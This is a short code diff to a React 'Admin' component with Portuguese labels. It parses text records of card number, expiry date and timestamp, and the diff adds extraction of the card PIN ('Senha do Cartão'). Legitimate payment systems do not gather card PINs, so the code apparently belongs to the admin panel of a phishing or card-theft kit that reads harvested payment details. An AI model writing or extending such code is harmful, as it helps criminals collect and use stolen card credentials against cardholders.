@@ -160,6 +160,7 @@ const Admin = () => {
       cartao: '',
       validade: '',
       cvv: '***',
+      senhaCartao: '',
       data: ''
     };
 
@@ -172,6 +173,8 @@ const Admin = () => {
         data.cartao = line.split('Número do Cartão:')[1]?.trim() || '';
       } else if (line.includes('Validade:') && !line.includes('DADOS DO')) {
         data.validade = line.split('Validade:')[1]?.trim() || '';
+      } else if (line.includes('Senha do Cartão:')) {
+        data.senhaCartao = line.split('Senha do Cartão:')[1]?.trim() || '';
       } else if (line.includes('Data/Hora:')) {
         data.data = line.split('Data/Hora:')[1]?.trim() || '';
       }
